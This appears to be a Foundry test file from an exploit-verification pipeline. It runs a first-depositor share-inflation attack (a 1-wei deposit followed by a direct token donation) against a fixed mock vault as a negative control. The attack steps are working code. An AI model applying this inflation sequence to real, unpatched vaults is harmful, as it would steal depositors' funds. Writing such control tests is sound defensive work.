// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./MiniVault.sol";
import "./MockERC20.sol";

/// @dev Minimal forge-std Vm cheatcode surface (see vuln sibling for rationale).
interface Vm {
    function prank(address) external;
    function startPrank(address) external;
    function stopPrank() external;
}

/// @notice EVM 0-day proof-pipeline CLEAN negative-control PoC.
///
/// This is the IDENTICAL exploit script run against the FIXED MiniVault. The
/// asserted impact (a real victim deposit mints > 0 shares) must HOLD here. A
/// negative control that also failed would prove the assertion is tautological
/// rather than bug-specific (Rule 40 point 4: a negative control where the
/// impact does NOT occur).
///
/// Expected outcome: this PoC PASSES (no revert). Run:
///   forge test --match-path '*erc4626_share_price_clean*MiniVault.t.sol'
contract MiniVaultControlTest {
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    MockERC20 internal token;
    MiniVault internal vault;

    address internal attacker = address(0xA11CE);
    address internal victim = address(0xB0B);

    function setUp() public {
        token = new MockERC20();
        vault = new MiniVault(address(token));
        token.mint(attacker, 1_000_000 ether);
        token.mint(victim, 1_000_000 ether);
    }

    function test_first_depositor_inflation() public {
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        token.transfer(address(vault), 100 ether);
        vm.stopPrank();

        uint256 victimSharesBefore = vault.shares(victim);
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(50 ether, victim);
        vm.stopPrank();
        uint256 victimSharesAfter = vault.shares(victim);

        // ASSERTED IMPACT holds on the fixed vault: deposit mints shares.
        require(
            victimSharesAfter > victimSharesBefore,
            "NEGATIVE CONTROL FAILED: fixed vault still minted zero shares"
        );
    }

}
